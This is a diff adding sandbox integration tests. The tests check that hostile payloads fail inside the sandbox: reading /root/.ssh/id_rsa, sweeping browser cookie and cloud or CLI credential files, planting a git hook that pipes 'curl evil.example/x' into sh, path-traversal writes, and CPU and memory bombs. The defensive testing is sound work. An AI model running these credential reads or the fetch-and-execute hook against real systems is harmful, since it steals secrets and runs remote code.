@@ -17,7 +17,9 @@ import subprocess
 import tempfile
 import time
 from pathlib import Path
+from unittest import mock
 
+from scripts.sandbox import capability
 from scripts.sandbox.boundary import Outcome, SandboxLimits
 from tests.integration.sandbox._harness import PRIMITIVES, SandboxIntegrationCase
 
@@ -93,6 +95,79 @@ class CredentialAccessTests(SandboxIntegrationCase):
         finally:
             del os.environ["GITHUB_TOKEN"]
 
+    def test_sbox_004_root_home_directory_is_unreadable(self) -> None:
+        # /root itself is denied outright on macOS (_ALWAYS_DENIED_READ_ROOTS
+        # in macos_seatbelt.py); on Linux CI it is a real, root-owned 0700
+        # directory a non-root reviewer can't even stat (PermissionError,
+        # not FileNotFoundError). Create a definite, disposable target under
+        # it first — never overwriting a real pre-existing key — so the
+        # assertion below can't pass merely because the path never existed;
+        # skip cleanly when this host can't provide or even see one.
+        target = Path("/root/.ssh/id_rsa")
+        created_dir = created_file = False
+        try:
+            if not target.parent.is_dir():
+                target.parent.mkdir(parents=True)
+                created_dir = True
+            if not _exists_or_false(target):
+                target.write_text("HOST-ROOT-SECRET")
+                created_file = True
+        except OSError:
+            pass
+        try:
+            if not _exists_or_false(target):
+                self.skipTest("cannot seed or find /root/.ssh/id_rsa on this host; denial cannot be exercised")
+            code = (
+                "print(open('/root/.ssh/id_rsa').read())\n"
+                "print('PAYLOAD-SUCCEEDED')\n"
+            )
+            for primitive in PRIMITIVES:
+                with self.subTest(primitive=primitive):
+                    result = self.run_python(primitive, code)
+                    self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
+                    if created_file:
+                        self.assertNotIn("HOST-ROOT-SECRET", result.stdout)
+        finally:
+            if created_file:
+                target.unlink(missing_ok=True)
+            if created_dir:
+                shutil.rmtree(target.parent, ignore_errors=True)
+
+    def test_sbox_004_browser_and_session_credential_stores_are_unreadable(self) -> None:
+        # Real on-host paths a compromised validation command would try
+        # first for cookie jars, saved sessions, and CLI-tool tokens. Which
+        # of these actually exist varies by host (a CI runner typically has
+        # none), so this is a best-effort sweep: skip explicitly, rather
+        # than silently pass, when none of them exist to exercise denial
+        # against.
+        candidates = (
+            "~/.netrc",
+            "~/.aws/credentials",
+            "~/.config/gh/hosts.yml",
+            "~/Library/Application Support/Google/Chrome/Default/Cookies",
+            "~/.mozilla/firefox/profiles.ini",
+            "~/Library/Cookies/Cookies.binarycookies",
+            "~/.config/google-chrome/Default/Cookies",
+        )
+        existing = [c for c in candidates if os.path.exists(os.path.expanduser(c))]
+        if not existing:
+            self.skipTest("no candidate browser/session credential path exists on this host")
+        code = (
+            "import os\n"
+            f"for rel in {candidates!r}:\n"
+            "    path = os.path.expanduser(rel)\n"
+            "    try:\n"
+            "        data = open(path, 'rb').read()\n"
+            "    except OSError:\n"
+            "        continue\n"
+            "    if data:\n"
+            "        print('PAYLOAD-SUCCEEDED')\n"
+        )
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                result = self.run_python(primitive, code)
+                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
+
 
 class FilesystemBoundaryTests(SandboxIntegrationCase):
     """SBOX-005, SBOX-006, SBOX-007: host paths, source writes, .git mutation."""
@@ -145,6 +220,59 @@ class FilesystemBoundaryTests(SandboxIntegrationCase):
                 result = self.run_python(primitive, code)
                 self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
         self.assertEqual(original_git_config.read_text(), "[core]\n")
+
+    def test_sbox_007_git_hooks_mutation_never_reaches_the_original_git_dir(self) -> None:
+        hooks_dir = self.source_dir / ".git" / "hooks"
+        hooks_dir.mkdir(parents=True, exist_ok=True)
+        original_hook = hooks_dir / "post-checkout"
+        original_hook.write_text("#!/bin/sh\n")
+        code = (
+            f"open('{original_hook}', 'w').write('#!/bin/sh\\ncurl evil.example/x | sh\\n')\n"
+            "print('PAYLOAD-SUCCEEDED')\n"
+        )
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                result = self.run_python(primitive, code)
+                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
+        self.assertEqual(original_hook.read_text(), "#!/bin/sh\n")
+
+    def test_sbox_005_host_absolute_path_write_is_denied(self) -> None:
+        outside = Path(tempfile.mkdtemp(prefix="crs-host-write-target-"))
+        target = outside / "canary.txt"
+        try:
+            code = f"open('{target}', 'w').write('MUTATED'); print('PAYLOAD-SUCCEEDED')"
+            for primitive in PRIMITIVES:
+                with self.subTest(primitive=primitive):
+                    result = self.run_python(primitive, code)
+                    self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
+            self.assertFalse(target.exists(), "hostile write reached a host path outside the workspace")
+        finally:
+            shutil.rmtree(outside, ignore_errors=True)
+
+    def test_sbox_005_path_traversal_write_does_not_escape_the_workspace(self) -> None:
+        marker_name = "traversal-canary.txt"
+        # Enough "../" segments to clear any plausible workspace nesting
+        # depth and land back in the real filesystem root if unconfined.
+        traversal = "/".join([".."] * 12 + [marker_name])
+        code = f"open('{traversal}', 'w').write('MUTATED'); print('PAYLOAD-SUCCEEDED')"
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                result = self.run_python(primitive, code)
+                # The absence of the success marker is real signal for
+                # every primitive: Docker's container root is owned by
+                # root while the payload runs as uid 65534, so even a
+                # traversal that reached the *container's own* "/" would
+                # still have to fail this specific assertion.
+                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
+        # The two checks below are host-filesystem checks and are only
+        # meaningful signal for a primitive that shares the host's real
+        # filesystem (Seatbelt, bwrap) — Docker's own container rootfs is
+        # a separate, already-discarded filesystem, so these can never
+        # observe a Docker-side escape that stayed inside that container;
+        # Docker's containment for this scenario is structural (its own
+        # mount/user namespace), proven above by the marker check instead.
+        self.assertFalse((Path("/") / marker_name).exists())
+        self.assertFalse((self.source_dir.parent / marker_name).exists())
 
 
 class ExternalWriteApiTests(SandboxIntegrationCase):
@@ -200,6 +328,42 @@ class ResourceExhaustionTests(SandboxIntegrationCase):
                 result = self.run_python(primitive, code, limits=limits)
                 self.assertEqual(result.outcome, Outcome.FAILED)
 
+    def test_sbox_010_cpu_budget_terminates_a_busy_loop(self) -> None:
+        # A tight, syscall-free busy loop. On Seatbelt/bwrap the sandboxed
+        # process itself carries RLIMIT_CPU (process_exec._preexec runs
+        # with apply_resource_limits=True there), so it must die from the
+        # 2s CPU ceiling well before the 25s wall-clock deadline — the
+        # duration assertion below is what actually proves that. Docker
+        # sets no per-process CPU-seconds limit (only a --cpus rate cap on
+        # the container, applied with apply_resource_limits=False on the
+        # docker-client wrapper process) so that primitive is bounded only
+        # by the wall-clock backstop here — real containment either way,
+        # but the CPU-specific ceiling is not what terminates it.
+        code = "x = 0\nwhile True:\n    x += 1\n"
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                limits = SandboxLimits(wall_clock_seconds=25, cpu_seconds=2)
+                started = time.monotonic()
+                result = self.run_python(primitive, code, limits=limits)
+                self.assertEqual(result.outcome, Outcome.FAILED)
+                if primitive is not capability.Primitive.DOCKER:
+                    self.assertLess(
+                        time.monotonic() - started, 15,
+                        "expected the RLIMIT_CPU ceiling, not the wall-clock backstop, to end this run",
+                    )
+
+    def test_sbox_010_memory_budget_terminates_an_allocation_bomb(self) -> None:
+        code = (
+            "chunks = []\n"
+            "while True:\n"
+            "    chunks.append(bytearray(10 * 1024 * 1024))\n"
+        )
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                limits = SandboxLimits(wall_clock_seconds=20, memory_bytes=150 * 1024 * 1024)
+                result = self.run_python(primitive, code, limits=limits)
+                self.assertEqual(result.outcome, Outcome.FAILED)
+
 
 class PersistenceTests(SandboxIntegrationCase):
     """SBOX-011: nothing survives teardown."""
@@ -219,6 +383,35 @@ class PersistenceTests(SandboxIntegrationCase):
                 self.assertEqual(
                     _matching_host_processes(marker_name), [],
                     "background descendant survived sandbox teardown",
+                )
+
+    def test_sbox_011_generated_artifacts_and_caches_do_not_persist_on_the_host(self) -> None:
+        from scripts.sandbox import runner as runner_module
+        from scripts.sandbox.workspace import prepare_workspace as real_prepare_workspace
+
+        code = (
+            "import os\n"
+            "os.makedirs('.cache', exist_ok=True)\n"
+            "open('generated-artifact.bin', 'wb').write(b'0' * 1024)\n"
+            "open('.cache/entry.tmp', 'wb').write(b'0' * 1024)\n"
+        )
+        for primitive in PRIMITIVES:
+            with self.subTest(primitive=primitive):
+                captured_roots: list[Path] = []
+
+                def _spying_prepare_workspace(source_dir):
+                    workspace = real_prepare_workspace(source_dir)
+                    captured_roots.append(workspace.root)
+                    return workspace
+
+                with mock.patch.object(
+                    runner_module, "prepare_workspace", side_effect=_spying_prepare_workspace
+                ):
+                    self.run_python(primitive, code, limits=SandboxLimits(wall_clock_seconds=10))
+                self.assertEqual(len(captured_roots), 1)
+                self.assertFalse(
+                    captured_roots[0].exists(),
+                    "disposable sandbox workspace (generated artifacts/caches) survived teardown",
                 )
 
 
@@ -251,6 +444,18 @@ class UnavailablePrimitiveTests(SandboxIntegrationCase):
         request = SandboxRequest(argv=("true",), source_dir=self.source_dir)
         result = run_instance.run(request)
         self.assertEqual(result.outcome, Outcome.UNAVAILABLE)
+
+
+def _exists_or_false(path: Path) -> bool:
+    """``Path.exists()`` that treats *any* OSError (not just a missing
+    path) as "can't tell" rather than propagating — e.g. Python 3.13+
+    raises ``PermissionError`` from ``exists()`` when an intervening
+    directory (a root-owned, 0700 ``/root`` on a non-root CI runner) can't
+    even be stat'd, instead of the historical "just return False"."""
+    try:
+        return path.exists()
+    except OSError:
+        return False
 
 
 def _matching_host_processes(needle: str) -> list[str]:
